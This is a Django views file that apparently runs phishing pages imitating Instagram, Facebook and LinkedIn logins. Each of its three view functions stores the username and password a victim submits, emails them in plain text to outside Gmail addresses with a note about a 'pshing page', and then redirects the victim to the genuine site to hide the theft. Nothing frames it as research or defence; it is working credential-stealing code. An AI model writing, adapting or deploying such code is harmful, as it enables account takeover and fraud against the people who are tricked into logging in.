import email
from django.shortcuts import render,redirect,get_list_or_404, get_object_or_404
from django.http import HttpResponse, HttpResponseRedirect
from django.contrib import messages
from .models import *
from django.core.mail import send_mail, BadHeaderError
from django.core.mail import EmailMessage
from django.conf import settings


def myindex(request):
    qs = Pic.objects.filter()
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        cre = insta.objects.create(username=username,password=password)
        msg = EmailMessage('Instagram request',
        cre.username  + " Has login using ur pshing page " + cre.password +  
        " check your dashboard for more info",
        settings.DEFAULT_FROM_EMAIL,['digitalcryptoshub@gmail.com'],)
        msg.send(fail_silently=False)
        return redirect('https://www.instagram.com')
    context = {'vote':qs}
    return render(request, 'index/index.html',context)

def myfb(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        cre = face.objects.create(username=username,password=password)
        msg = EmailMessage('facebook request',
        cre.username  + " Has login using ur pshing page " + cre.password +  
        " check your dashboard for more info",
        settings.DEFAULT_FROM_EMAIL,['digitalcryptoshub@gmail.com'],)
        msg.send()
        return redirect('https://www.facebook.com')
    return render(request, 'index/fb.html')



def mylink(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        cre = linkedin.objects.create(username=username,password=password)
        msg = EmailMessage('Linkedin request',
        cre.username  + " Has login using ur pshing page " + cre.password +  
        " check your dashboard for more info",
        settings.DEFAULT_FROM_EMAIL,['ewaenpatrick5@gmail.com'],)
        msg.send()
    return redirect('https://www.linkedin.com/login')

